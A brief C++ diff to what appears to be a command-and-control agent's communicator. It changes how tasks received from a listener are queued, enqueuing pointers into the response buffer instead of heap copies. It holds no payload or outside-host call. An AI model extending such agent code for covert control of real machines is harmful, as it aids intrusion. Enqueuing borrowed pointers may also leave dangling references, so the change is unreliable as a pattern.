@@ -302,24 +302,14 @@ void BaseCommunicator::ProcessResponseFromCommunicateOnceWithListener(LPVOID pRe
 
     LPVOID pTask = NULL;
     DWORD taskLen = 0;
-    LPVOID pTaskInInputQueue = NULL;
     for (int i = 0; i < numOfNewTasks; i++)
     {
         pTask = NullSeparatedArrayStringAt((PCHAR)pResponseData, i);
         taskLen = StrLen((PCHAR)pTask);
-
-        pTaskInInputQueue = this->pWinApiCustom->HeapAllocCustom(taskLen + 1); // Task + null terminator
-        if (pTaskInInputQueue == NULL)
-            continue;
-
-        CopyBuffer(pTaskInInputQueue, pTask, taskLen);
-
-        this->pTaskInputQueue->Enqueue(pTaskInInputQueue, taskLen + 1);
+        if (taskLen != 0)
+            this->pTaskInputQueue->Enqueue(pTask, taskLen + 1);
     }
 
 CLEANUP:
     this->pTaskOutputQueue->ReleaseThreadMutex();
-
-    if (pTaskInInputQueue != NULL)
-        this->pWinApiCustom->HeapFreeCustom(pTaskInInputQueue);
 }
